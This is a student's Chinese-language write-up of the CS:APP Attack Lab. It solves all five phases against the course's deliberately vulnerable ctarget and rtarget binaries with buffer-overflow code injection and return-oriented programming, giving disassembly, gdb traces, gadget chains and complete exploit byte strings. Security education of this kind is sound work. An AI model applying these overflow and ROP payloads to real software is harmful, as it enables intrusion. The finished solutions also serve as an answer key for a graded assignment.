# Attack Lab

## 前言

`Attack Lab`的目的是帮助我理解`x86-64`处理器架构上的堆栈原理，通过构造一个字符串输入，利用缓冲区溢出(`buffer overflow`)漏洞，来修改一个二进制可执行文件的运行时行为，从而达到攻击的目的。

## 实验目标

- 1.理解并能实现代码注入攻击和`rop`攻击，它们的原理都是利用了缓冲区溢出的漏洞
- 2.了解如何编写更安全的程序(从底层的角度进行思考)，并且通过编译器和`os`的特点来减少程序漏洞
- 3.深入理解`x86-64`机器代码运行的堆栈原理和参数传递规则
- 4.深入理解`x86-64`指令的编码方式
- 5.熟练对`gdb`和`objdump`的使用

## 实验说明

缓冲区溢出攻击的两种类型：
- `Code Injection`：代码注入攻击
- `Return-oriented Programming`：`rop`攻击

[![3yCPZq.png](https://s2.ax1x.com/2020/02/29/3yCPZq.png)](https://imgchr.com/i/3yCPZq)

文件说明：
- `ctarget`：`Linux`二进制可执行文件，用于实现代码注入攻击
- `rtarget`：`Linux`二进制可执行文件，用于实现`rop`攻击
- `farm.c`：`rtarget`的部分源文件，内容是一系列单纯`ret`函数，在实现`rop`攻击时会用到
- `cookie`：`8`字节大小的签名信息，等会儿被作为传递的参数使用到
- `hex2raw`：工具，通过它来生成我们的**攻击字符串**

程序运行说明：

- `h`：打印可能的命令行参数
- `q`：不向打分服务器发送结果（用于自学）
- `i File`：从已经创建好的文件输入，代替`stdin`

尝试运行程序`ctarget`，输入任意字符串，看一下程序的行为

```
$ ./ctarget -q
Cookie: 0x59b997fa
Type string:12345
No exploit.  Getbuf returned 0x1
Normal return
```

在输入了字符串`12345`后，程序响应`No expoit`...`Normal return`说明我们随意构造的字符串并不能对程序造成攻击，需要进一步往下看

目标程序：

我们在`ctarget`和`rtarget`实现的攻击都是利用它们调用`getbuf()`函数时发生的缓冲区溢出漏洞，所以我们需要分析`getbuf()`的运行逻辑

```cpp
unsigned getbuf() {
    char buf[BUFFER_SIZE];
    Gets(buf); 
    return 1;
}
```

分析`getbuf()`的运行逻辑，函数先是创建了一个定长的缓冲区，再从输入读取字符填充到`buf`，在这里我们需要注意的是`Gets()`并没有检查缓冲区边界的机制，如果我们读取到超出这个`BUFFER_SIZE`大小的字符串，就有可能破坏栈中存储的状态信息

如果`getbuf()`没有发生栈溢出，会正常返回`1`给上级函数，接下来我们什么函数调用了`getbuf()`

```cpp
void test() {
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n",  val);
}
```

果然，`test()`调用了`getbuf()`，如果程序正常的从`getbuf()`返回到`test()`，我们就会得到`No exploit`这样的信息，表明未能成功实施攻击

所以，接下来，我们要根据具体的线索，围绕`getbuf()`处的缓冲区漏洞展开攻击。

## Part1 : Code Injection Attacks

我们需要构造字符串参数，对程序`ctarget`进行三次代码注入攻击。

有一些前提，需要我们知道：

这个程序以这样一种方式放置，它的栈空间布局每次运行时都不会发生变化，并且栈中的数据段可以被认为是可执行代码，这两个前提为代码注入攻击提供了便利。这也是最早的缓冲区溢出攻击方式，在没有任何防范措施的情况下。

### Level 1

先来道开胃菜，这个`phase`并不要求我们进行代码注入攻击，而是降低难度，利用缓冲区溢出漏洞，让`getbuf()`执行结束后不返回`test()`，而是跳转到我们想要的函数位置`touch1()`处。

`touch1()`函数有如下的`C`语言表示：

```cpp
void touch1(){
    vlevel=1; 
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

当然，在这里我们要获取`touch1`在内存中的地址，才能实施准确的跳转。

用`objdump`工具对`ctarget`进行反汇编：

```s
00000000004017c0 <touch1>:  # 0x4017c0
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:	00 00 00 
  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 <puts@plt>
  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
  4017dd:	e8 ab 04 00 00       	callq  401c8d <validate>
  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
  4017e7:	e8 54 f6 ff ff       	callq  400e40 <exit@plt>
```

得到`touch1`的内存地址`0x4017c0`

```s
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp # 开辟了40个字节的栈空间
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

```s
0000000000401968 <test>:
  401968:	48 83 ec 08          	sub    $0x8,%rsp
  40196c:	b8 00 00 00 00       	mov    $0x0,%eax
  401971:	e8 32 fe ff ff       	callq  4017a8 <getbuf>
  401976:	89 c2                	mov    %eax,%edx 
  401978:	be 88 31 40 00       	mov    $0x403188,%esi
  40197d:	bf 01 00 00 00       	mov    $0x1,%edi
  401982:	b8 00 00 00 00       	mov    $0x0,%eax
  401987:	e8 64 f4 ff ff       	callq  400df0 <__printf_chk@plt>
  40198c:	48 83 c4 08          	add    $0x8,%rsp
  401990:	c3                   	retq   
```

我们的目标是让缓冲区溢出，在`getbuf()`中调用`Gets()`指令位置`0x4017af`处以及`retq`指令位置`0x4017bd`分别设置断点，查看栈中数据的情况。

```bash
$ gdb ctarget 

(gdb) break *0x4017af   # callq  401a40 <Gets>
Breakpoint 1 at 0x4017af: file buf.c, line 14.

(gdb) break *0x4017bd  #　retq 
Breakpoint 2 at 0x4017bd: file buf.c, line 16.

(gdb) run -q
Starting program: /home/tangyiheng/csapp/lab/attacklab/ctarget -q
Cookie: 0x59b997fa

Breakpoint 1, 0x00000000004017af in getbuf () at buf.c:14
14	in buf.c

(gdb) info r rsp　#  查看调用Gets()之前栈顶指针的值
rsp            0x5561dc78          0x5561dc78

(gdb) step

Breakpoint 1, 0x00000000004017bd in getbuf () at buf.c:16
16	in buf.c
 
(gdb) info r rsp #  查看retq之前栈顶指针的值
rsp            0x5561dca0          0x5561dca0

(gdb) x/40bx 0x5561dc78 
0x5561dc78:	0x31	0x32	0x33	0x34	0x35	0x00	0x00	0x00
0x5561dc80:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x5561dc88:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x5561dc90:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x5561dc98:	0x00	0x60	0x58	0x55	0x00	0x00	0x00	0x00

# 查看程序在运行了Gets()后栈中的数据，刚好从0x5561dc78处开始是我们输入的字符串12345

(gdb) x/8bx 0x5561dca0
0x5561dca0:	0x76	0x19	0x40	0x00	0x00	0x00	0x00	0x00

# 查看程序在运行了Gets()后 执行retq将要跳转的地址

```

从上述分析可得，`getbuf()`在运行了`Gets()`后 执行`retq`将要跳转的地址正好是`test()`的地址`0x401876`，注意：小端表示法下对象应该从右往左看

那么，我们猜想如果我们这个时候的栈顶`0x5561dca0`处放上我们要跳转`touch1()`的地址，程序是不是会将这个跳转弹出并跳转呢？

于是，构造字符串如下：

```txt
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
c0 17 40 00 00 00 00 00 /* the addr of touch1(): 0x4017c0  */
```

测试一下构造的字符串，

```bash
$ ./ctarget -qi answer/phase_1_raw 
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00 
```

`PASS`！！！

字符串的大小显然超出了缓冲区的边界，并将`getbuf()`的被调用函数存储的状态信息(返回地址)给覆盖，导致控制权转移给了`touch1()`。

### Level 2

下面，我们就要真正的开始进行代码注入攻击了。我们需要在构造的字符串中设计我们想要执行的代码(底层上其实是机器指令)。

同样，我们不能让`getbuf()`函数返回`test()`，而是重定向到`touch2()`，下面是`touch2()`的`C`语言表示：

```cpp
void touch2(unsigned val){
    vlevel = 2;
    if(val == cookie){
        printf("Touch2!: You called touch2(0x%.8x)\n",val);
        validate(2);
    }else{
        printf("Misfire: You called touch2(0x%.8x)\n",val);
        fail(2);
    }
    exit(2);
}
```

`touch2()`的汇编语言表示: `$0x4017ec`

```s
00000000004017ec <touch2>:
  4017ec:	48 83 ec 08          	sub    $0x8,%rsp
  4017f0:	89 fa                	mov    %edi,%edx
  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
  4017f9:	00 00 00 
  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie>
  401802:	75 20                	jne    401824 <touch2+0x38>
  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi
  401809:	bf 01 00 00 00       	mov    $0x1,%edi
  40180e:	b8 00 00 00 00       	mov    $0x0,%eax
  401813:	e8 d8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
  401818:	bf 02 00 00 00       	mov    $0x2,%edi
  40181d:	e8 6b 04 00 00       	callq  401c8d <validate>
  401822:	eb 1e                	jmp    401842 <touch2+0x56>
  401824:	be 10 31 40 00       	mov    $0x403110,%esi
  401829:	bf 01 00 00 00       	mov    $0x1,%edi
  40182e:	b8 00 00 00 00       	mov    $0x0,%eax
  401833:	e8 b8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
  401838:	bf 02 00 00 00       	mov    $0x2,%edi
  40183d:	e8 0d 05 00 00       	callq  401d4f <fail>
  401842:	bf 00 00 00 00       	mov    $0x0,%edi
  401847:	e8 f4 f5 ff ff       	callq  400e40 <exit@plt>
```

得到`touch2()`在内存中的地址：`


`touch2()`在`touch1()`的基础上要求我们向其传入一个无符号整数的参数，并且这个传入的参数需要与你的`cookie`相同，那么我们需要将操作`cookie`的指令嵌入到构造的攻击字符串中。

这里，有一个线索我们需要知道：当调用一个函数时，第一个参数会被存储到`%rdi`中。

所以，我们需要构造一系列指令，在重定向前，让`cookie`传送到寄存器`%rdi`中，同时还要将`touch2()`的地址压入栈中。

构造指令如下：

```s
pushq  $0x4017ec # addr of touch2
mov    $0x59b997fa,%rdi # set cookie to rdi
retq 
```

那么问题来了，我们如何将这个汇编语言转化为机器代码呢？

可以采用先编译，再反汇编的方式得到机器代码。

`gcc -c code.s`和`objdump -d code.o`得到机器代码如下：

```s
0000000000000000 <.text>:
   0:	68 ec 17 40 00       	pushq  $0x4017ec
   5:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   c:	c3                   	retq 
```

构造攻击字符串，让程序在跳转到`touch3()`之前先执行我们注入的代码(一系列机器指令)，因为代码注入攻击实验中，我们多次运行程序时，栈的位置是固定的，所以我们直接用上个`phase`的`rsp`。

```txt
68 ec 17 40 00 48 c7 c7  /* addr: 0x5561dc78 to run my code */
fa 97 b9 59 c3 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
78 dc 61 55 00 00 00 00 /* addr: 0x5561dca0 jump to 0x5561dc78 */
```

测试一下，

```bash
$ ./ctarget -qi answer/phase_2_raw
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:2:68 EC 17 40 00 48 C7 C7 FA 97 B9 59 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 
```

`PASS`!!!

我们需要意识到，因为栈的位置固定化以及栈中不限制可执行区域，导致了代码注入攻击实现起来相当的容易

### Level 3

下面，我们要在函数调用间传递的就不是一个值了，而是一个指向字符串的地址。

先看一个`touch3(char *sval)`的`C`语言和汇编语言表示：

```cpp
void touch3(char *sval){
    vlevel=3;
    if(hexmatch(cookie,sval)){
        printf("Touch3!: You called touch3(\"%s\")\n",sval);
        validate(3);
    }else{
        printf("Misfire: You called touch3(\"%s\")\n",sval);
        fail(3);
    }
    exit(0);
}
```

```s
00000000004018fa <touch3>:
  4018fa:	53                   	push   %rbx
  4018fb:	48 89 fb             	mov    %rdi,%rbx
  4018fe:	c7 05 d4 2b 20 00 03 	movl   $0x3,0x202bd4(%rip)        # 6044dc <vlevel>
  401905:	00 00 00 
  401908:	48 89 fe             	mov    %rdi,%rsi
  40190b:	8b 3d d3 2b 20 00    	mov    0x202bd3(%rip),%edi        # 6044e4 <cookie>
  401911:	e8 36 ff ff ff       	callq  40184c <hexmatch>
  401916:	85 c0                	test   %eax,%eax
  401918:	74 23                	je     40193d <touch3+0x43>
  40191a:	48 89 da             	mov    %rbx,%rdx
  40191d:	be 38 31 40 00       	mov    $0x403138,%esi
  401922:	bf 01 00 00 00       	mov    $0x1,%edi
  401927:	b8 00 00 00 00       	mov    $0x0,%eax
  40192c:	e8 bf f4 ff ff       	callq  400df0 <__printf_chk@plt>
  401931:	bf 03 00 00 00       	mov    $0x3,%edi
  401936:	e8 52 03 00 00       	callq  401c8d <validate>
  40193b:	eb 21                	jmp    40195e <touch3+0x64>
  40193d:	48 89 da             	mov    %rbx,%rdx
  401940:	be 60 31 40 00       	mov    $0x403160,%esi
  401945:	bf 01 00 00 00       	mov    $0x1,%edi
  40194a:	b8 00 00 00 00       	mov    $0x0,%eax
  40194f:	e8 9c f4 ff ff       	callq  400df0 <__printf_chk@plt>
  401954:	bf 03 00 00 00       	mov    $0x3,%edi
  401959:	e8 f1 03 00 00       	callq  401d4f <fail>
  40195e:	bf 00 00 00 00       	mov    $0x0,%edi
  401963:	e8 d8 f4 ff ff       	callq  400e40 <exit@plt>
```

可以看到，`touch3`的首地址是`0x4018fa`，并且调用了`hexmath(unsigned val, char *sval)`，下面看一下`hexmath`的`C`语言表示：

```cpp
/* compare string to hex represention of unsigned value */
int hexmatch(unsigned val,char *sval){
    char cbuf[110];
    /* make position of check string unpredictable */
    char *s = cbuf+random()%100;
    sprintf(s,"%.8x",val);
    return strncmp(sval,s,9) == 0;
}
```

`hexmath`函数也创建了一定大小的缓冲区，将传入的指针指向的字符串和`cookie`进行比较，只有相等才算攻击成功。

`cookie:0x59b997fa`字符串在机器代码中以`ASCII`码的形式来表示：`35 39 62 39 39 37 66 61`

需要注意的是，如果我们将字符串存在`getbuf()`分配的栈帧空间内的话，当`getbuf()`重定向`touch3()`，然后`touch3()`会调用`hexmatch()`，新创建的栈帧可能会覆盖掉我们传入的指针参数指向的字符串，所以，我的做法是表示`cookie`的字符串放到栈为`touch3`分配栈帧以前的位置，根据栈后进先出的特点，`touch3`以后的函数是不会覆盖掉我们存放的字符串的。

接下来，我们要做的是通过`gdb`调试工具获取存放`cookie`字符串的地址，设置为重定向到`touch3`的后`9`个字节，以`\0`终止字符串。根据上一个`phase`，得到目标地址为`0x5561dca0 + 0x8 = 0x5561dca8`

构造指令如下，

```s
push $0x4018fa
movl $0x5561dca8,%rdi
retq
```

构造字符串如下，

```txt
68 fa 18 40 00 48 c7 c7 /* addr:0x5561dc78 run my code */
a8 dc 61 55 c3 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
78 dc 61 55 00 00 00 00 /* addr:0x5561dca0 */
35 39 62 39 39 37 66 61 /* addr:0x5561dca8 val:str(cookie) */
```

测试，

```bash
$ ./ctarget -qi answer/phase_3_raw
Cookie: 0x59b997fa
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:3:68 FA 18 40 00 48 C7 C7 A8 DC 61 55 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 
```

`PASS`!!!

## Part2 : Return-oriented Programming Attacks

下面我们提到的是在现代操作系统为了应对缓冲区溢出攻击实施了栈随机化和限制可执行内存区域后，从而诞生的一种新的攻击方式，不是向栈中数据区域内注入代码，而是程序中的已有代码，通过一系列的`gadgets`，来组成我们自己的代码，完成执行逻辑。而这些`gadget`的特点是它们不会创建本地变量，在栈中不分配额外空间，只是单纯的`ret`或者对入參操作，那么我们可以截取这些`gadget`的部分机器代码组成我们的其中一条或多条逻辑，然后通过`ret`到下一个`gadget`继续拼接我们自己的代码。

![3yCpss.png](https://s2.ax1x.com/2020/02/29/3yCpss.png)

就这样，一系列的`gadget`地址在栈中组成了一条控制转移链，不断的拼凑出我们想要的代码，执行我们想要的逻辑，从而实现攻击。

用到的部分汇编代码编码成机器代码的规则：

![3yC9Ln.png](https://s2.ax1x.com/2020/02/29/3yC9Ln.png)

### Level 2

因为不能注入代码，我们只好从`rtarget`的部分源码`farm.c`上找`gadget`，来拼凑代码。

我们想要的逻辑是，将`cookie`作为无符号整数的形式在重定向`touch2()`之前传送到寄存器`$rdi`中。

于是，想到可以先将`cookie`存放到栈顶，然后利用拼接的`push %rax`指令将其从栈中弹出到寄存器`$rax1`中，再利用拼接的传送指令`movl %rax,%rdi`以完成整个逻辑。

在`farm.c`对应的汇编代码中找到两个`gadget`：

```s
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq   

00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq 
```

拼接这两个`gadget`，从而得到我们想要的汇编代码：

```s
58  pop(%rax)
90  nop
c3  retq
48 89 c7    movq %rax,%rdi
90          nop
c3          retq
```

于是乎，构造字符串如下：

```txt
00 00 00 00 00 00 00 00 /* 0x28 bytes */
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
ab 19 40 00 00 00 00 00 /* addr of gadget1 */
fa 97 b9 59 00 00 00 00 /* cookie: 0x59b997fa */
c5 19 40 00 00 00 00 00 /* addr of gadget2 */
ec 17 40 00 00 00 00 00 /* addr of touch2(rdi):  */
```

测试，

```bash
$ ./rtarget -qi answer/phase_4_raw
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 
```

`PASS`!!!


### Level 3

这一关加大了难度，还是利用之前`touch3()`的代码，我们需要将指向字符串的指针传递给寄存器`$rdi`中，这个时候我们需要获取当前指令的栈顶地址`$rsp`，通过`movq %rsp,%rax`，将地址存放到了寄存器`$rax`中

但是我们要得可不是当前栈顶，而是存放在`touch3`地址之后的地址，那么我们就需要对地址进行一个加法操作，在`farm.c`中只找到`lea (%rdi,rsi,1),%rax`可以用来计算地址

于是，需要将地址转移到`%rdi`，偏移量转移到`%rsi`，以完成目标地址的计算，而偏移量是根据最后我们需要的`gadgets`的个数来定的。

查阅汇编指令编码表以及阅读`farm.c`的源码，

找到如下一条逻辑链以完成我们将字符串的地址传递给寄存器`$rdi`，同时新调用的函数`hexmath`不会覆盖掉字符串的内容。

- 1.首先获取当前指令地址    rbp -> rax
```s
0000000000401a03 <addval_190>:
  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
  401a09:	c3                   	retq  
```
- 2.将rax存储的地址放在rdi  rax -> rdi
```s
00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq  
```
- 3.获取偏移量x放在rax  pop %rax
```s
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq   
```
- 4.    eax -> edx
```s
00000000004019db <getval_481>:
  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
  4019e0:	c3                   	retq   
```
- 5.    edx -> ecx
```s
0000000000401a33 <getval_159>:
  401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax
  401a38:	c3                   	retq  
```
- 6.    ecx -> esi
```s
0000000000401a11 <addval_436>:
  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
  401a17:	c3                   	retq  
```
- 7.计算地址+偏移 rdi + rsi -> rax
```s
00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	retq   
```
- 8.    rax -> rdi
```s
00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq  
```
- 9.    goto touch3

构造字符串如下，

```txt
00 00 00 00 00 00 00 00 /* 0x28 bytes */
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
06 1a 40 00 00 00 00 00 /* addr of movq %rbp,%rax */
c5 19 40 00 00 00 00 00 /* addr of movq %rax,%rdi */
ab 19 40 00 00 00 00 00 /* addr of pop %rax */
48 00 00 00 00 00 00 00 /* bias of str addr  */
dd 19 40 00 00 00 00 00 /* addr of movl %eax,%edx */
34 1a 40 00 00 00 00 00 /* addr of movl %edx,%ecx  */
13 1a 40 00 00 00 00 00 /* addr of movl %ecx,%esi */
d6 19 40 00 00 00 00 00 /* addr of lea (%rdi,rsi,1),%rax */
c5 19 40 00 00 00 00 00 /* addr of movq %rax,%rdi */
fa 18 40 00 00 00 00 00 /* addr of touch3(%rdi) */
35 39 62 39 39 37 66 61 /* str of cookie */
00 /*  \0 */
```

测试结果如下，

```bash
$ ./rtarget -qi answer/phase_5_raw
Cookie: 0x59b997fa
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00 
```

`PASS`!!!

然后回顾，需要特别注意的是偏移量的计算时：

当`ret`弹出当前栈的地址后，并且控制转移给该处的函数时，`rsp`自动加上`8`个字节，指向下一个地址，
这时候读到的`rsp`，实际上就是之后`ret`将要弹出栈顶内容的地址。

- `retq` 相当与 `pop + jmp`， 弹出栈顶`8`个字节的地址(x86-64)， 并且跳转到这个地址处，执行该地址处的逻辑,也就是控制转移的过程。

小结一下，

感觉`rop`就是在栈随机化和限制可执行代码区域后，提出的一种策略，避免了代码注入，因为代码注入需要代码段在栈中的地址

- 栈的随机化使得找不到代码段，不可执行区域使得代码段根本执行不了

`rop`是利用目标程序已有的代码，通过多个`gadget`拼接成想要的逻辑的代码实现，其实是拼接机器指令(汇编代码层面上看)啦

为什么能实现呢？这得依赖与程序中要有可以作为`gadget`的函数才行，这种函数不会创建本地变量，只是单纯的ret或者对传入的参数操作，截取这些函数的机器代码层面的部分，仍然能够得到一条或多条合法的指令，我们可以一点一点的拼凑出想要的逻辑，从而完成攻击，本质上还是缓冲区溢出攻击，通过溢出，使得我们能够跳到不寻常的地方而不是设计者预期跳转的地方，从而执行我们想要的逻辑。


## 实验总结

本次实验对计算机系统安全有了一定的认识，一定注意编写可靠的代码，避免缓冲区溢出漏洞，给攻击者可趁之机。

还对汇编层、机器代码层、栈帧结构及原理、如何通过寄存器和栈在函数调用传递参数有了更深的认识

最后，纸上得来终觉浅，觉知此事要躬行

学习完理论知识后，最好实践一下，真正理解这些知识。

## 补充

通用的栈帧结构：

栈用来传递参数、存储返回信息、保护寄存器以及局部存储。

![3y9vRg.png](https://s2.ax1x.com/2020/02/29/3y9vRg.png)

## 参考

